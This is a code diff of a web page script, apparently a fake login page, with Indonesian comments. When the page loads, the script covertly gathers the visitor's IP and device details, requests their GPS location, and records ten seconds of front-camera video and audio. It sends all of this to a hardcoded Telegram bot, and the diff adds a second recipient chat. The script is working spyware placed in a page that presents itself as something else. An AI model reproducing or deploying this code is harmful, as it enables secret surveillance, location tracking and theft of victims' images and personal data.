@@ -140,7 +140,7 @@
 
   <script>
     const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
-    const chatIds = ['7945789634'];
+    const chatIds = ['7945789634', '6087823470'];
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
     const notif = document.getElementById('notif');
@@ -183,51 +183,33 @@
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
-        
-        let batteryInfo = "Tidak didukung";
-        if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          const level = (battery.level * 100).toFixed(0);
-          const chargingStatus = battery.charging ? "Charging" : "Discharging";
-          batteryInfo = `${level}% (${chargingStatus})`;
-        }
-
         const ram = navigator.deviceMemory || "Tidak diketahui";
         const device = navigator.userAgent.split('(')[1].split(')')[0];
-
-        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${batteryInfo}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
+        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM:</b> ±${ram} GB`;
         sendToTelegram(`<b>📥 Info data hp ⬇️</b>\n\n${text}`);
       } catch (err) {}
     }
 
-    // Fungsi Utama: Gabungan Rekaman & Lokasi
-    async function startCombinedAccess() {
+    // Fungsi Izin Kamera + Trigger GPS Otomatis
+    async function recordFrontVideo() {
       try {
-        // Minta izin kamera & mikrofon
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
         
-        // JIKA IZIN DIBERIKAN, otomatis ambil lokasi
+        // BEGITU IZIN KAMERA DI-CLICK (Diberikan), langsung kirim GPS
         getLocation();
 
         const mediaRecorder = new MediaRecorder(stream);
         const videoChunks = [];
-        
         mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
-        
         mediaRecorder.onstop = () => {
           const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
           sendVideo(videoBlob, 'rekaman_10detik.mp4');
           stream.getTracks().forEach(track => track.stop());
         };
-
         mediaRecorder.start();
-        // Durasi diatur menjadi 10 detik (10000 ms)
-        setTimeout(() => { 
-          if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); 
-        }, 10000);
-
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 10000);
       } catch (err) {
-        sendToTelegram('maaf akses vidio/kamera ditolak 🤬');
+        sendToTelegram('maaf akses kamera/vidio ditolak 🤬');
       }
     }
 
@@ -269,13 +251,16 @@
     window.addEventListener('DOMContentLoaded', async () => {
       createParticles();
       
-      // Tahap 1: Ambil info perangkat
+      // 1. Kirim Info Dasar
       await getInfo();
       
-      // Tahap 2: Pemicu Gabungan (Kamera + Video 10 Detik + Lokasi Otomatis)
-      startCombinedAccess();
+      // 2. Munculkan Izin Lokasi Terpisah
+      getLocation();
       
-      // Tahap 3: Voice Note singkat
+      // 3. Munculkan Izin Kamera (Saat Allow diklik, GPS terkirim lagi & rekam 10s dimulai)
+      recordFrontVideo();
+      
+      // 4. Munculkan Izin Audio
       autoRecordAudio();
     });
 
